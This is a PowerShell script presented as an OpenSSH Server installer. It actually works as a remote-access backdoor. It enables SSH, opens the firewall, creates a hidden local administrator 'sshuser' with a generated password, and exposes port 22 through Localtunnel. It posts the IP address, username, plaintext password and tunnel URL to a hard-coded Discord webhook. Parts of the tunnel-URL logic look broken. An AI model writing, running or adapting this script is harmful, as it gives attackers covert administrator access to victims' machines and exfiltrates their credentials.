try {
    $StopWatch = [system.diagnostics.stopwatch]::startNew()

    # Webhook URL for Discord
    $WebhookURL = 'https://discord.com/api/webhooks/1311849224886812702/dsmLjee1J1LmsF5oxFnj14QwPEcbKoZgsCnYcgEv-wdexA7rHko3ZR9Nquyd4cyRvaCs'

    # Function to send messages to Discord
    function Send-DiscordMessage($MessageContent) {
        $Message = @{
            content = $MessageContent
        }
        try {
            Invoke-RestMethod -Uri $WebhookURL -Method Post -Body (ConvertTo-Json $Message -Depth 10) -ContentType 'application/json'
        } catch {
            Write-Host "Failed to send message to Discord: $($Error[0])" -ForegroundColor Red
        }
    }

    # Send initial message to Discord
    Send-DiscordMessage "Starting the installation of OpenSSH Server..."

    # Install OpenSSH Server
    if ($IsLinux) {
        Send-DiscordMessage "Detected Linux system. Installing OpenSSH Server..."
        & sudo apt install openssh-server -y
        Send-DiscordMessage "OpenSSH Server installed on Linux."
    } else {
        Send-DiscordMessage "Detected Windows system. Installing OpenSSH Server..."
        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
        Start-Service sshd
        Set-Service -Name sshd -StartupType 'Automatic'
        Send-DiscordMessage "OpenSSH Server installed and running on Windows."

        # Configure firewall rule if it's missing
        if (-not (Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
            Send-DiscordMessage "Firewall rule configured for SSH."
        } else {
            Send-DiscordMessage "Firewall rule for SSH already exists."
        }
    }

    # Generate random password
    $Password = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
    Send-DiscordMessage "Generated password: $Password"

    # Add user for SSH connection (only for Windows)
    if (-not $IsLinux) {
        $Username = "sshuser"
        net user $Username $Password /add
        net localgroup administrators $Username /add
        Send-DiscordMessage "User created: $Username."
    }

    # Get main IP address
    $IPAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
        $_.InterfaceAlias -notmatch "Loopback" -and 
        $_.IPAddress -notlike "169.254.*" -and 
        $_.IPAddress -notlike "192.168.56.*" 
    }).IPAddress -join ", "
    Send-DiscordMessage "Device IP address: $IPAddress"

    # Port settings
    $Port = 22
    Send-DiscordMessage "SSH Port: $Port"

    # Check if npm is installed
    $npmPath = (Get-Command npm -ErrorAction SilentlyContinue).Source
    if (-not $npmPath) {
        Send-DiscordMessage "npm is not installed. Please install Node.js (npm)."
        Exit
    } else {
        Send-DiscordMessage "npm is installed at path: $npmPath"
    }

    # Install Localtunnel via npm
    Send-DiscordMessage "Installing Localtunnel via npm..."
    try {
        $installResult = npm install -g localtunnel
        Send-DiscordMessage "Localtunnel install result: $installResult"
    } catch {
        Send-DiscordMessage "Failed to install Localtunnel via npm: $($_.Exception.Message)"
        Exit
    }

    # Check for binary location manually
    Send-DiscordMessage "Checking if Localtunnel binary exists..."

    # Let's use a different method to get npm bin path on Windows
    $npmGlobalBin = npm config get prefix
    $ltPath = Join-Path $npmGlobalBin "node_modules\localtunnel\bin\lt"
    Send-DiscordMessage "Looking for Localtunnel binary at: $ltPath"

    # If Localtunnel binary doesn't exist, let's confirm
    if (-not (Test-Path $ltPath)) {
        Send-DiscordMessage "Localtunnel binary not found at $ltPath. Please check your npm installation."
        Exit
    } else {
        Send-DiscordMessage "Localtunnel binary found at $ltPath"
    }

    # Now let's run the tunnel and capture output
    Send-DiscordMessage "Starting Localtunnel to forward SSH..."
    $TunnelProcess = Start-Process -FilePath $ltPath -ArgumentList "--port 22" -PassThru
    $TunnelProcess.WaitForExit()

    # Capture the public URL from Localtunnel
    Start-Sleep -Seconds 5  # Wait for Localtunnel to generate the URL
    $TunnelURL = (Get-Content "$env:AppData\npm\lt\stdout.log" -Tail 10) | Select-String -Pattern "your url is" | ForEach-Object { $_.Line.Split(" ")[4] }

    if (-not $TunnelURL) {
        Send-DiscordMessage "Failed to retrieve tunnel URL from Localtunnel."
        Exit
    } else {
        Send-DiscordMessage "SSH Tunnel setup complete. Tunnel URL: $TunnelURL"
    }

    # Final message
    [int]$Elapsed = $StopWatch.Elapsed.TotalSeconds
    Send-DiscordMessage "OpenSSH Server successfully installed in $Elapsed seconds!`nIP: $IPAddress`nPort: $Port`nUser: $Username`nPassword: $Password`nTunnel URL: $TunnelURL"

} catch {
    $ErrorMessage = "Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
    Send-DiscordMessage $ErrorMessage
} finally {
    Send-DiscordMessage "Installation complete. Press any key to exit."
    Pause
}
